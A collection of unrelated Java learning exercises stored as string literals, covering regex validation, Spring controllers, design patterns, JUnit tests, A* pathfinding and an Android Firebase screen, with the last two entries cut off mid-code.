    "package org.example;\n\nimport java.util.Arrays;\nimport java.util.HashMap;\nimport java.util.Map;\nimport java.util.function.Function;\nimport java.util.regex.Matcher;\nimport java.util.regex.Pattern;\nimport java.util.stream.Collectors;\n\npublic class Main {\n    public static void main(String[] args) {\n        String email = \"my_25@domen-38.de\";\n        System.out.println(\"\u041d\u0430\u0448 email - \" + isValidEmail(email));\n\n        String password = \"aA1!@#$%^&_+-=)\";\n        System.out.println(\"\u041d\u0430\u0448 \u043f\u0430\u0440\u043e\u043b\u044c - \" + isValidPassword(password));\n\n        String text = \"\u041f\u0440\u0438\u0432\u0435\u0442 \u043a\u0430\u043a \u043a\u0430\u043a, \u043f\u043e\u043a\u0430, \u043f\u0440\u0438\u0432\u0435\u0442 \u043f\u0440\u0438\u0432\u0435\u0442, \u043d\u0435\u0442, \u043d\u0435\u0442, \u043d\u0435\u0442, \u0434\u0430, \u043d\u0435\u0442, \u0434\u0430\";\n        Map<String, Integer> wordCountMap = wordsCount(text);\n        System.out.println(\"\u041d\u0430\u0448\u0438 \u0441\u043b\u043e\u0432\u0430: \");\n        for (Map.Entry<String, Integer> entry : wordCountMap.entrySet()) {\n            System.out.println(entry.getKey() + \": \" + entry.getValue());\n        }\n        System.out.println();\n          regWordsCount(text);\n    }\n\n    /* 1. \u041d\u0430\u043f\u0438\u0441\u0430\u0442\u044c \u0440\u0435\u0433\u0443\u043b\u044f\u0440\u043d\u043e\u0435 \u0432\u044b\u0440\u0430\u0436\u0435\u043d\u0438\u0435 \u0434\u043b\u044f \u043f\u0440\u043e\u0432\u0435\u0440\u043a\u0438 email (\u043d\u0430\u043f\u0440\u0438\u043c\u0435\u0440 my_25@domen-38.de). */\n    public static boolean isValidEmail(String email) {\n        String reg = \"^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\\\.[a-zA-Z]{2,}$\";\n        Pattern pattern = Pattern.compile(reg);\n        Matcher matcher = pattern.matcher(email);\n        return matcher.matches();\n    }\n\n    /* 2.* \u041d\u0430\u043f\u0438\u0441\u0430\u0442\u044c \u0440\u0435\u0433\u0443\u043b\u044f\u0440\u043d\u043e\u0435 \u0432\u044b\u0440\u0430\u0436\u0435\u043d\u0438\u0435 \u0434\u043b\u044f \u043f\u0440\u043e\u0432\u0435\u0440\u043a\u0438 \u043a\u043e\u0440\u0440\u0435\u043a\u0442\u043d\u043e\u0441\u0442\u0438 \u043d\u043e\u0432\u043e\u0433\u043e \u043f\u0430\u0440\u043e\u043b\u044f, \u043a\u043e\u0442\u043e\u0440\u044b\u0439 \u0441\u043e\u043e\u0442\u0432\u0435\u0442\u0441\u0442\u0432\u0443\u0435\u0442 \u043e\u043f\u0440\u0435\u0434\u0435\u043b\u0435\u043d\u043d\u044b\u043c\n    \u043a\u0440\u0438\u0442\u0435\u0440\u0438\u044f\u043c:\n\u0441\u043e\u0441\u0442\u043e\u044f\u0442\u044c \u043c\u0438\u043d\u0438\u043c\u0443\u043c \u0438\u0437 8 \u0441\u0438\u043c\u0432\u043e\u043b\u043e\u0432;\n\u0434\u043e\u043b\u0436\u0435\u043d \u043e\u0431\u044f\u0437\u0430\u0442\u0435\u043b\u044c\u043d\u043e \u0432\u043a\u043b\u044e\u0447\u0430\u0442\u044c \u0445\u043e\u0442\u044f \u0431\u044b \u043e\u0434\u043d\u0443 \u043c\u0430\u043b\u0435\u043d\u044c\u043a\u0443\u044e \u0431\u0443\u043a\u0432\u0443;\n\u0434\u043e\u043b\u0436\u0435\u043d \u043e\u0431\u044f\u0437\u0430\u0442\u0435\u043b\u044c\u043d\u043e \u0432\u043a\u043b\u044e\u0447\u0430\u0442\u044c \u0445\u043e\u0442\u044f \u0431\u044b \u043e\u0434\u043d\u0443 \u0431\u043e\u043b\u044c\u0448\u0443\u044e \u0431\u0443\u043a\u0432\u0443;\n\u0434\u043e\u043b\u0436\u0435\u043d \u043e\u0431\u044f\u0437\u0430\u0442\u0435\u043b\u044c\u043d\u043e \u0432\u043a\u043b\u044e\u0447\u0430\u0442\u044c \u0445\u043e\u0442\u044f \u0431\u044b \u043e\u0434\u043d\u0443 \u0446\u0438\u0444\u0440\u0443;\n\u0434\u043e\u043b\u0436\u0435\u043d \u043e\u0431\u044f\u0437\u0430\u0442\u0435\u043b\u044c\u043d\u043e \u0432\u043a\u043b\u044e\u0447\u0430\u0442\u044c \u0445\u043e\u0442\u044f \u0431\u044b \u043e\u0434\u0438\u043d \u0441\u043f\u0435\u0446\u0441\u0438\u043c\u0432\u043e\u043b (\u043f\u0440\u0438\u043c\u0435\u0440: !@#$%^&_+-=); */\n    public static boolean isValidPassword(String password) {\n        String reg = \"^(?=.*[a-z])(?=.*[A-Z])(?=.*\\\\d)(?=.*[@#$%^&_+-=]).{8,}$\";\n        Pattern pattern = Pattern.compile(reg);\n        Matcher matcher = pattern.matcher(password);\n        return matcher.matches();\n    }\n\n    /* 3. \u0420\u0430\u0437\u0431\u0438\u0442\u044c \u0442\u0435\u043a\u0441\u0442 \u043d\u0430 \u0441\u043b\u043e\u0432\u0430 \u0441 \u043f\u043e\u043c\u043e\u0449\u044c\u044e \u0440\u0435\u0433\u0443\u043b\u044f\u0440\u043d\u043e\u0433\u043e \u0432\u044b\u0440\u0430\u0436\u0435\u043d\u0438\u0435 \u0438 \u0440\u0430\u0441\u0441\u0447\u0438\u0442\u0430\u0442\u044c \u0441\u043b\u043e\u0432\u0430\u0440\u044c \u0432\u0441\u0442\u0440\u0435\u0447\u0430\u044e\u0449\u0438\u0445\u0441\u044f \u0441\u043b\u043e\u0432 \u0434\u043b\u044f \u044d\u0442\u043e\u0433\u043e\n    \u0442\u0435\u043a\u0441\u0442\u0430 (\u043f\u043e\u0434\u0441\u0447\u0438\u0442\u0430\u0442\u044c \u043a\u043e\u043b\u0438\u0447\u0435\u0441\u0442\u0432\u043e \u043e\u0434\u0438\u043d\u0430\u043a\u043e\u0432\u044b\u0445 \u0441\u043b\u043e\u0432, \u0432\u0441\u0442\u0440\u0435\u0447\u0430\u044e\u0449\u0438\u0445\u0441\u044f \u0432 \u044d\u0442\u043e\u043c \u0442\u0435\u043a\u0441\u0442\u0435). */\n    public static Map<String, Integer> wordsCount(String text) {\n        Map<String, Integer> wordMap = new HashMap<>();\n        String reg = \"[\\\\s,.?]\";\n        Pattern pattern = Pattern.compile(reg);\n        Matcher matcher = pattern.matcher(text.toLowerCase());\n        int subStart = 0;\n        int subEnd = 0;\n        String word;\n        while (matcher.find()) {\n            subEnd = matcher.start();\n            word = text.substring(subStart, subEnd);\n            wordMap.put(word.toLowerCase(), wordMap.getOrDefault(word, 0) + 1);\n            subStart = subEnd + 1;\n        }\n        word = text.substring(subStart);\n        wordMap.put(word.toLowerCase(), wordMap.getOrDefault(word, 0) + 1);\n        return wordMap;\n    }\n\n    // \u0432\u0430\u0440\u0438\u0430\u043d\u0442 \u0441 \u0444\u0443\u043d\u043a\u0446\u0438\u043e\u043d\u0430\u043b\u044c\u043d\u044b\u043c \u043f\u0440\u043e\u0433\u0440\u0430\u043c\u043c\u0438\u0440\u043e\u0432\u0430\u043d\u0438\u0435\u043c\n    public static void regWordsCount(String text) {\n        Map<String, Long> wordCount = Arrays.stream(text.toLowerCase()\n                        .split(\"[\\\\s,.?]\"))\n                .collect(Collectors.groupingBy(Function.identity(), Collectors.counting()));\n        wordCount.forEach((word, count) -> System.out.println(word + \" - \" + count));\n    }\n}",
    "/*\n * Copyright 2013-2018 the original author or authors.\n *\n * Licensed under the Apache License, Version 2.0 (the \"License\");\n * you may not use this file except in compliance with the License.\n * You may obtain a copy of the License at\n *\n *      https://www.apache.org/licenses/LICENSE-2.0\n *\n * Unless required by applicable law or agreed to in writing, software\n * distributed under the License is distributed on an \"AS IS\" BASIS,\n * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n * See the License for the specific language governing permissions and\n * limitations under the License.\n */\n\npackage com.quanxiaoha.weblobweb.demos.web;\n\nimport org.springframework.stereotype.Controller;\nimport org.springframework.web.bind.annotation.PathVariable;\nimport org.springframework.web.bind.annotation.RequestMapping;\nimport org.springframework.web.bind.annotation.RequestMethod;\nimport org.springframework.web.bind.annotation.ResponseBody;\n\n/**\n * @author <a href=\"mailto:chenxilzx1@gmail.com\">theonefx</a>\n */\n@Controller\npublic class PathVariableController {\n\n    // http://127.0.0.1:8080/user/123/roles/222\n    @RequestMapping(value = \"/user/{userId}/roles/{roleId}\", method = RequestMethod.GET)\n    @ResponseBody\n    public String getLogin(@PathVariable(\"userId\") String userId, @PathVariable(\"roleId\") String roleId) {\n        return \"User Id : \" + userId + \" Role Id : \" + roleId;\n    }\n\n    // http://127.0.0.1:8080/javabeat/somewords\n    @RequestMapping(value = \"/javabeat/{regexp1:[a-z-]+}\", method = RequestMethod.GET)\n    @ResponseBody\n    public String getRegExp(@PathVariable(\"regexp1\") String regexp1) {\n        return \"URI Part : \" + regexp1;\n    }\n}\n",
    "package Lab5;\r\n\r\n// The target interface, representing the desired interface\r\ninterface MediaPlayer {\r\n    void play(String audioType, String fileName);\r\n}\r\n\r\n// An existing class w/ different interface\r\nclass AdvancedMediaPlayer {\r\n    public void playVlc(String fileName) {\r\n        System.out.println(\"Playing vlc file: \" + fileName);\r\n    }\r\n\r\n    public void playMp4(String fileName) {\r\n        System.out.println(\"Playing mp4 file: \" + fileName);\r\n    }\r\n}\r\n\r\n// Adapter class which makes the incompatible interface compatible\r\nclass MediaAdapter implements MediaPlayer {\r\n    AdvancedMediaPlayer advancedMusicPlayer;\r\n\r\n    public MediaAdapter(String audioType){\r\n        // Create the appropriate player based on the audio type\r\n        if(audioType.equalsIgnoreCase(\"vlc\") ){\r\n            advancedMusicPlayer = new AdvancedMediaPlayer();         \r\n        } else if (audioType.equalsIgnoreCase(\"mp4\")){\r\n            advancedMusicPlayer = new AdvancedMediaPlayer();\r\n        }   \r\n    }\r\n\r\n    @Override\r\n    public void play(String audioType, String fileName) {\r\n        // Call method based on audio type\r\n        if(audioType.equalsIgnoreCase(\"vlc\")){\r\n            advancedMusicPlayer.playVlc(fileName);\r\n        } else if(audioType.equalsIgnoreCase(\"mp4\")){\r\n            advancedMusicPlayer.playMp4(fileName);\r\n        }\r\n    }\r\n}\r\n\r\n// Client class that uses the adapter\r\nclass AudioPlayer implements MediaPlayer {\r\n    MediaAdapter mediaAdapter; \r\n\r\n    @Override\r\n    public void play(String audioType, String fileName) {\r\n        // Adapter is used when the audio type is vlc or mp4\r\n        if(audioType.equalsIgnoreCase(\"vlc\") || audioType.equalsIgnoreCase(\"mp4\")){\r\n            mediaAdapter = new MediaAdapter(audioType);\r\n            mediaAdapter.play(audioType, fileName);\r\n        } else {\r\n            System.out.println(\"Invalid media. \" + audioType + \" format not supported\");\r\n        }\r\n    }   \r\n\r\n    // Main\r\n    public static void main(String[] args) {\r\n        AudioPlayer audioPlayer = new AudioPlayer();\r\n\r\n        audioPlayer.play(\"mp4\", \"beyond_the_horizon.mp4\");\r\n        audioPlayer.play(\"vlc\", \"far_far_away.vlc\");\r\n        audioPlayer.play(\"avi\", \"mind_me.avi\"); // Unsupported format\r\n    }\r\n}\r\n",
    "import java.io.ByteArrayInputStream;\nimport java.io.ByteArrayOutputStream;\nimport java.io.PrintStream;\n\nimport org.junit.Test;\n\nimport static org.junit.Assert.*;\n\npublic class DemoTest {\n    @Test\n    public void testIsTriangle() {\n        String input = \"3\\n4\\n5\\n\";\n\n        ByteArrayInputStream bais = new ByteArrayInputStream(input.getBytes());\n        System.setIn(bais);\n\n        ByteArrayOutputStream baos = new ByteArrayOutputStream();\n        System.setOut(new PrintStream(baos));\n\n        String[] args = {};\n        Demo.main(args);\n\n        String consoleOutput = \"Enter side 1: \" + System.getProperty(\"line.separator\");\n        consoleOutput += \"Enter side 2: \" + System.getProperty(\"line.separator\");\n        consoleOutput += \"Enter side 3: \" + System.getProperty(\"line.separator\");\n        consoleOutput += \"This is a triangle.\" + System.getProperty(\"line.separator\");\n\n        assertEquals(consoleOutput, baos.toString());\n    }\n    @Test\n    public void testNotTriangle() {\n        String input = \"1\\n2\\n3\\n\";\n\n        ByteArrayInputStream bais = new ByteArrayInputStream(input.getBytes());\n        System.setIn(bais);\n\n        ByteArrayOutputStream baos = new ByteArrayOutputStream();\n        System.setOut(new PrintStream(baos));\n\n        String[] args = {};\n        Demo.main(args);\n\n        String consoleOutput = \"Enter side 1: \" + System.getProperty(\"line.separator\");\n        consoleOutput += \"Enter side 2: \" + System.getProperty(\"line.separator\");\n        consoleOutput += \"Enter side 3: \" + System.getProperty(\"line.separator\");\n        consoleOutput += \"This is not a triangle.\" + System.getProperty(\"line.separator\");\n\n        assertEquals(consoleOutput, baos.toString());\n    }\n\n    @Test\n    public void testZero() {\n        String input = \"0\\n3\\n6\\n\";\n\n        ByteArrayInputStream bais = new ByteArrayInputStream(input.getBytes());\n        System.setIn(bais);\n\n        ByteArrayOutputStream baos = new ByteArrayOutputStream();\n        System.setOut(new PrintStream(baos));\n\n        String[] args = {};\n        Demo.main(args);\n\n        String consoleOutput = \"Enter side 1: \" + System.getProperty(\"line.separator\");\n        consoleOutput += \"Enter side 2: \" + System.getProperty(\"line.separator\");\n        consoleOutput += \"Enter side 3: \" + System.getProperty(\"line.separator\");\n        consoleOutput += \"This is not a triangle.\" + System.getProperty(\"line.separator\");\n\n        assertEquals(consoleOutput, baos.toString());\n    }\n    //Assert results instead of console output and input\n    @Test\n    public void test_is_triangle_1() {\n        assertTrue(Demo.isTriangle(3, 4, 5));\n    }\n    @Test\n    public void test_is_triangle_2() {\n        assertTrue(Demo.isTriangle(5, 12, 13));\n    }\n    @Test\n    public void test_is_triangle_3() {\n        assertTrue(Demo.isTriangle(5, 13, 12));\n    }\n    @Test\n    public void test_is_triangle_4() {\n        assertTrue(Demo.isTriangle(12, 5, 13));\n    }\n    @Test\n    public void test_is_triangle_5() {\n        assertTrue(Demo.isTriangle(12, 13, 5));\n    }\n    @Test\n    public void test_is_NOT_triangle_1() {\n        assertFalse(Demo.isTriangle(7, 2, 11));\n    }\n    @Test\n    public void test_is_NOT_triangle_2() {\n        assertFalse(Demo.isTriangle(2, 11, 7));\n    }\n    @Test\n    public void test_is_NOT_triangle_3() {\n        assertFalse(Demo.isTriangle(3, 12, 9));\n    }\n    @Test\n    public void test_is_NOT_triangle_4() {\n        assertFalse(Demo.isTriangle(0,7, 5));\n    }\n    @Test\n    public void test_is_NOT_triangle_5() {\n        assertFalse(Demo.isTriangle(-1, 8, 9));\n    }\n    @Test\n    public void test_is_NOT_triangle_6() {\n        assertFalse(Demo.isTriangle(8, 9, -1));\n    }\n    @Test\n    public void test_is_NOT_triangle_7() {\n        assertFalse(Demo.isTriangle(2, 9, 11));\n    }\n}\n",
    "import java.util.ArrayList;\nimport java.util.Scanner;\n\nclass Student {\n    private String name;\n    private int rollNumber;\n    private String grade;\n\n    public Student(String name, int rollNumber, String grade) {\n        this.name = name;\n        this.rollNumber = rollNumber;\n        this.grade = grade;\n    }\n\n    public String getName() {\n        return name;\n    }\n\n    public int getRollNumber() {\n        return rollNumber;\n    }\n\n    public String getGrade() {\n        return grade;\n    }\n\n    @Override\n    public String toString() {\n        return \"Name: \" + name + \", Roll Number: \" + rollNumber + \", Grade: \" + grade;\n    }\n}\n\nclass StudentManagementSystem {\n    private ArrayList<Student> students;\n\n    public StudentManagementSystem() {\n        students = new ArrayList<>();\n    }\n\n    public void addStudent(Student student) {\n        students.add(student);\n    }\n\n    public void removeStudent(int rollNumber) {\n        students.removeIf(student -> student.getRollNumber() == rollNumber);\n    }\n\n    public Student searchStudent(int rollNumber) {\n        for (Student student : students) {\n            if (student.getRollNumber() == rollNumber) {\n                return student;\n            }\n        }\n        return null;\n    }\n\n    public void displayAllStudents() {\n        if (students.isEmpty()) {\n            System.out.println(\"No students enrolled.\");\n        } else {\n            System.out.println(\"List of Students:\");\n            for (Student student : students) {\n                System.out.println(student);\n            }\n        }\n    }\n}\n\npublic class Main {\n    public static void main(String[] args) {\n        Scanner scanner = new Scanner(System.in);\n        StudentManagementSystem sms = new StudentManagementSystem();\n\n        while (true) {\n            System.out.println(\"\\nStudent Management System\");\n            System.out.println(\"1. Add Student\");\n            System.out.println(\"2. Remove Student\");\n            System.out.println(\"3. Search Student\");\n            System.out.println(\"4. Display All Students\");\n            System.out.println(\"5. Exit\");\n            System.out.print(\"Enter your choice: \");\n            int choice = scanner.nextInt();\n\n            switch (choice) {\n                case 1:\n                    System.out.print(\"Enter student name: \");\n                    scanner.nextLine(); \n                    String name = scanner.nextLine();\n                    System.out.print(\"Enter roll number: \");\n                    int rollNumber = scanner.nextInt();\n                    System.out.print(\"Enter grade: \");\n                    String grade = scanner.next();\n                    sms.addStudent(new Student(name, rollNumber, grade));\n                    System.out.println(\"Student added successfully.\");\n                    break;\n                case 2:\n                    System.out.print(\"Enter roll number of student to remove: \");\n                    int removeRollNumber = scanner.nextInt();\n                    sms.removeStudent(removeRollNumber);\n                    System.out.println(\"Student removed successfully.\");\n                    break;\n                case 3:\n                    System.out.print(\"Enter roll number of student to search: \");\n                    int searchRollNumber = scanner.nextInt();\n                    Student searchedStudent = sms.searchStudent(searchRollNumber);\n                    if (searchedStudent != null) {\n                        System.out.println(\"Student found:\");\n                        System.out.println(searchedStudent);\n                    } else {\n                        System.out.println(\"Student not found.\");\n                    }\n                    break;\n                case 4:\n                    sms.displayAllStudents();\n                    break;\n                case 5:\n                    System.out.println(\"Exiting Student Management System. Goodbye!\");\n                    System.exit(0);\n                default:\n                    System.out.println(\"Invalid choice. Please try again.\");\n            }\n        }\n    }\n}\n",
    "package be.arlioz.exempleJavadoc;\n\n/**\n * La classe SuperHero repr\u00e9sente un super-h\u00e9ros.\n *\n * @author Captain America\n * @see be.arlioz.exempleJavadoc\n */\npublic class SuperHero {\n    /**\n     * Le nom du super-h\u00e9ros.\n     */\n    private String heroName;\n\n    /**\n     * Le niveau de sant\u00e9 du super-h\u00e9ros.\n     */\n    private int health;\n\n    /**\n     * Constructeur de SuperHero\n     * @param heroName nom du h\u00e9ro\n     * @param health sant\u00e9 du h\u00e9ro\n     */\n    public SuperHero(String heroName, int health) {\n        this.heroName = heroName;\n        this.health = health;\n    }\n\n    /**\n     * Calcule la sant\u00e9 restante du h\u00e9ros apr\u00e8s une attaque.\n     *\n     * @param incomingDamage Montant des d\u00e9g\u00e2ts entrants\n     * @return Sant\u00e9 restante du h\u00e9ros apr\u00e8s l'attaque\n     * @see <a href=\"http://www.link_to_jira/HERO-402\">HERO-402</a>\n     */\n    public int calculateHealth(int incomingDamage) {\n        this.health-= incomingDamage;\n        if (this.health < 0) {this.health = 0;}\n        return this.health;\n    }\n    /**\n     * Affiche les attributs de h\u00e9ro sous forme de texte.\n     *\n     */\n    @Override\n    public String toString() {\n        return \"SuperHero{\" +\n                \"Nom='\" + heroName + '\\'' +\n                \", Sant\u00e9=\" + health +\n                '}';\n    }\n\n    /**\n     * Renvoie la sant\u00e9 du h\u00e9ro.\n     *\n     * @return La sant\u00e9 du h\u00e9ro.\n     */\n    public int getHealth() {\n        return health;\n    }\n}\n",
    "/*\n * Click nbfs://nbhost/SystemFileSystem/Templates/Licenses/license-default.txt to change this license\n */\n\npackage com.mycompany.astarsearch;\n\n/**\n *\n * @author ADMIN\n */\nimport java.util.HashMap;\nimport java.util.Map;\nimport java.util.LinkedHashMap;\nimport java.util.ArrayList;\nimport java.util.Collections;\nimport java.util.List;\n\nclass Cell {\n\tint parent_i, parent_j;\n\tdouble f, g, h;\n\n\tCell() {\n\t\tthis.parent_i = 0;\n\t\tthis.parent_j = 0;\n\t\tthis.f = 0;\n\t\tthis.g = 0;\n\t\tthis.h = 0;\n\t}\n}\n\npublic class AStarSearch {\n\n\tprivate static final int ROW = 9;\n\tprivate static final int COL = 10;\n\n\tpublic static void main(String[] args) {\n\t\t// Description of the Grid-\n\t\t// 1--> The cell is not blocked\n\t\t// 0--> The cell is blocked\n\t\tint[][] grid = {\n\t\t\t\t{1, 0, 1, 1, 1, 1, 0, 1, 1, 1},\n\t\t\t\t{1, 1, 1, 0, 1, 1, 1, 0, 1, 1},\n\t\t\t\t{1, 1, 1, 0, 1, 1, 0, 1, 0, 1},\n\t\t\t\t{0, 0, 1, 0, 1, 0, 0, 0, 0, 1},\n\t\t\t\t{1, 1, 1, 0, 1, 1, 1, 0, 1, 0},\n\t\t\t\t{1, 0, 1, 1, 1, 1, 0, 1, 0, 0},\n\t\t\t\t{1, 0, 0, 0, 0, 1, 0, 0, 0, 1},\n\t\t\t\t{1, 0, 1, 1, 1, 1, 0, 1, 1, 1},\n\t\t\t\t{1, 1, 1, 0, 0, 0, 1, 0, 0, 1}\n\t\t};\n\n\t\t// Source is the left-most bottom-most corner\n\t\tint[] src = {8, 0};\n\n\t\t// Destination is the left-most top-most corner\n\t\tint[] dest = {0, 0};\n\n\t\taStarSearch(grid, src, dest);\n\t}\n\n\tprivate static boolean isValid(int row, int col) {\n\t\treturn (row >= 0) && (row < ROW) && (col >= 0) && (col < COL);\n\t}\n\n\tprivate static boolean isUnBlocked(int[][] grid, int row, int col) {\n\t\treturn grid[row][col] == 1;\n\t}\n\n\tprivate static boolean isDestination(int row, int col, int[] dest) {\n\t\treturn row == dest[0] && col == dest[1];\n\t}\n\n\tprivate static double calculateHValue(int row, int col, int[] dest) {\n\t\treturn Math.sqrt((row - dest[0]) * (row - dest[0]) + (col - dest[1]) * (col - dest[1]));\n\t}\n\n\tprivate static void tracePath(Cell[][] cellDetails, int[] dest) {\n\t\tSystem.out.println(\"The Path is \");\n\t\tint row = dest[0];\n\t\tint col = dest[1];\n\n\t\tMap<int[], Boolean> path = new LinkedHashMap<>();\n\n\t\twhile (!(cellDetails[row][col].parent_i == row && cellDetails[row][col].parent_j == col)) {\n\t\t\tpath.put(new int[]{row, col}, true);\n\t\t\tint temp_row = cellDetails[row][col].parent_i;\n\t\t\tint temp_col = cellDetails[row][col].parent_j;\n\t\t\trow = temp_row;\n\t\t\tcol = temp_col;\n\t\t}\n\n\t\tpath.put(new int[]{row, col}, true);\n\t\tList<int[]> pathList = new ArrayList<>(path.keySet());\n\t\tCollections.reverse(pathList);\n\n\t\tpathList.forEach(p -> {\n\t\t\tif (p[0] == 2 || p[0] == 1) {\n\t\t\t\tSystem.out.print(\"-> (\" + p[0] + \", \" + (p[1]) + \")\");\n\t\t\t} else {\n\t\t\t\tSystem.out.print(\"-> (\" + p[0] + \", \" + p[1] + \")\");\n\t\t\t}\n\t\t});\n\t\tSystem.out.println(); \n\t}\n\n\tprivate static void aStarSearch(int[][] grid, int[] src, int[] dest) {\n\t\tif (!isValid(src[0], src[1]) || !isValid(dest[0], dest[1])) {\n\t\t\tSystem.out.println(\"Source or destination is invalid\");\n\t\t\treturn;\n\t\t}\n\n\t\tif (!isUnBlocked(grid, src[0], src[1]) || !isUnBlocked(grid, dest[0], dest[1])) {\n\t\t\tSystem.out.println(\"Source or the destination is blocked\");\n\t\t\treturn;\n\t\t}\n\n\t\tif (isDestination(src[0], src[1], dest)) {\n\t\t\tSystem.out.println(\"We are already at the destination\");\n\t\t\treturn;\n\t\t}\n\n\t\tboolean[][] closedList = new boolean[ROW][COL];\n\t\tCell[][] cellDetails = new Cell[ROW][COL];\n\n\t\tfor (int i = 0; i < ROW; i++) {\n\t\t\tfor (int j = 0; j < COL; j++) {\n\t\t\t\tcellDetails[i][j] = new Cell();\n\t\t\t\tcellDetails[i][j].f = Double.POSITIVE_INFINITY;\n\t\t\t\tcellDetails[i][j].g = Double.POSITIVE_INFINITY;\n\t\t\t\tcellDetails[i][j].h = Double.POSITIVE_INFINITY;\n\t\t\t\tcellDetails[i][j].parent_i = -1;\n\t\t\t\tcellDetails[i][j].parent_j = -1;\n\t\t\t}\n\t\t}\n\n\t\tint i = src[0], j = src[1];\n\t\tcellDetails[i][j].f = 0;\n\t\tcellDetails[i][j].g = 0;\n\t\tcellDetails[i][j].h = 0;\n\t\tcellDetails[i][j].parent_i = i;\n\t\tcellDetails[i][j].parent_j = j;\n\n\t\tMap<Double, int[]> openList = new HashMap<>();\n\t\topenList.put(0.0, new int[]{i, j});\n\n\t\tboolean foundDest = false;\n\n\t\twhile (!openList.isEmpty()) {\n\t\t\tMap.Entry<Double, int[]> p = openList.entrySet().iterator().next();\n\t\t\topenList.remove(p.getKey());\n\n\t\t\ti = p.getValue()[0];\n\t\t\tj = p.getValue()[1];\n\t\t\tclosedList[i][j] = true;\n\n\t\t\tdouble gNew, hNew, fNew;\n\n\t\t\t// 1st Successor (North)\n\t\t\tif (isValid(i - 1, j)) {\n\t\t\t\tif (isDestination(i - 1, j, dest)) {\n\t\t\t\t\tcellDetails[i - 1][j].parent_i = i;\n\t\t\t\t\tcellDetails[i - 1][j].parent_j = j;\n\t\t\t\t\tSystem.out.println(\"The destination cell is found\");\n\t\t\t\t\ttracePath(cellDetails, dest);\n\t\t\t\t\tfoundDest = true;\n\t\t\t\t\treturn;\n\t\t\t\t} else if (!closedList[i - 1][j] && isUnBlocked(grid, i - 1, j)) {\n\t\t\t\t\tgNew = cellDetails[i][j].g + 1;\n\t\t\t\t\thNew = calculateHValue(i - 1, j, dest);\n\t\t\t\t\tfNew = gNew + hNew;\n\n\t\t\t\t\tif (cellDetails[i - 1][j].f == Double.POSITIVE_INFINITY\n\n|| cellDetails[i - 1][j].f > fNew) {\n\t\t\t\t\t\topenList.put(fNew, new int[]{i - 1, j});\n\n\t\t\t\t\t\tcellDetails[i - 1][j].f = fNew;\n\t\t\t\t\t\tcellDetails[i - 1][j].g = gNew;\n\t\t\t\t\t\tcellDetails[i - 1][j].h = hNew;\n\t\t\t\t\t\tcellDetails[i - 1][j].parent_i = i;\n\t\t\t\t\t\tcellDetails[i - 1][j].parent_j = j;\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\n\t\t\t// 2nd Successor (South)\n\t\t\tif (isValid(i + 1, j)) {\n\t\t\t\tif (isDestina",
    "package com.spring.mvc.inter.format.controller;\r\n\r\nimport java.util.List;\r\n\r\nimport javax.validation.Valid;\r\n\r\nimport org.springframework.beans.propertyeditors.StringTrimmerEditor;\r\nimport org.springframework.stereotype.Controller;\r\nimport org.springframework.validation.BindingResult;\r\nimport org.springframework.validation.ObjectError;\r\nimport org.springframework.web.bind.WebDataBinder;\r\nimport org.springframework.web.bind.annotation.InitBinder;\r\nimport org.springframework.web.bind.annotation.ModelAttribute;\r\nimport org.springframework.web.bind.annotation.RequestMapping;\r\nimport org.springframework.web.bind.annotation.RequestMethod;\r\n\r\nimport com.spring.mvc.inter.format.dtoclass.CommunicationDto;\r\nimport com.spring.mvc.inter.format.dtoclass.DtoClass;\r\nimport com.spring.mvc.inter.format.dtoclass.Phone;\r\nimport com.spring.mvc.inter.format.propertyeditor.NameProperEditor;\r\n\r\n@Controller\r\npublic class RegPageController {\r\n\r\n\t@RequestMapping(\"/\")\r\n\tpublic String home(@ModelAttribute(\"RegPage\") DtoClass dto) {\r\n\t\tSystem.out.println(\"Inside home page controller\");\r\n\t\tPhone phone = new Phone();\r\n\t\tphone.setCountrycode(\"91\");\r\n\t\tphone.setNumber(\"11111111\");\r\n\t\tCommunicationDto comdto = new CommunicationDto();\r\n\t\tcomdto.setPhone(phone);\r\n\t\tdto.setComdto(comdto);\r\n\t\treturn \"home-page\";\r\n\t}\r\n\r\n\t@RequestMapping(path = \"/processing\", method = RequestMethod.POST)\r\n\tpublic String result(@Valid @ModelAttribute(\"RegPage\") DtoClass dto, BindingResult result) {\r\n\t\tif (result.hasErrors()) {\r\n\t\t\tSystem.out.println(\"my page has errors\");\r\n\t\t\tList<ObjectError> allErrors = result.getAllErrors();\r\n\t\t\tfor (ObjectError err : allErrors) {\r\n\t\t\t\tSystem.out.println(err);\r\n\t\t\t}\r\n\t\t\treturn \"home-page\";\r\n\t\t}\r\n\t\treturn \"res-page\";\r\n\t}\r\n\r\n\t@InitBinder\r\n\tpublic void initBinder(WebDataBinder binder) {\r\n\t\tSystem.out.println(\"Inside the binder method\");\r\n\r\n\t\tStringTrimmerEditor editor = new StringTrimmerEditor(true);\r\n\t\tbinder.registerCustomEditor(String.class, \"name\", editor);\r\n\t\t\r\n\t\tNameProperEditor propertyEditor=new NameProperEditor();\r\n\t\tbinder.registerCustomEditor(String.class,\"name\", propertyEditor);\r\n\t}\r\n}\r\n",
    "package com.example.educapoio;\n\nimport androidx.appcompat.app.AppCompatActivity;\n\nimport android.os.Bundle;\nimport android.view.View;\nimport android.widget.Button;\nimport android.widget.EditText;\nimport android.widget.Toast;\n\nimport com.google.android.gms.tasks.OnCompleteListener;\nimport com.google.android.gms.tasks.Task;\nimport com.google.firebase.auth.FirebaseAuth;\nimport com.google.firebase.auth.FirebaseUser;\n\npublic class editarPerfil extends AppCompatActivity {\n\n    private EditText editEmail;\n    private Button btnSalvar;\n\n    @Override\n    protected void onCreate(Bundle savedInstanceState) {\n        super.onCreate(savedInstanceState);\n        setContentView(R.layout.activity_editar_perfil);\n\n        editEmail = findViewById(R.id.editEmail2);\n        btnSalvar = findViewById(R.id.btnSalvar);\n\n        FirebaseUser user = FirebaseAuth.getInstance().getCurrentUser();\n        if (user != null) {\n            // Define o email atual do usu\u00e1rio no campo de edi\u00e7\u00e3o\n            editEmail.setText(user.getEmail());\n        }\n\n        btnSalvar.setOnClickListener(new View.OnClickListener() {\n            @Override\n            public void onClick(View v) {\n                // Obt\u00e9m o novo email inserido pelo usu\u00e1rio\n                String novoEmail = editEmail.getText().toString().trim();\n\n                // Verifica se o campo de email n\u00e3o est\u00e1 vazio\n                if (!novoEmail.isEmpty()) {\n                    // Atualiza o email do usu\u00e1rio no Firebase Authentication\n                    user.updateEmail(novoEmail)\n                            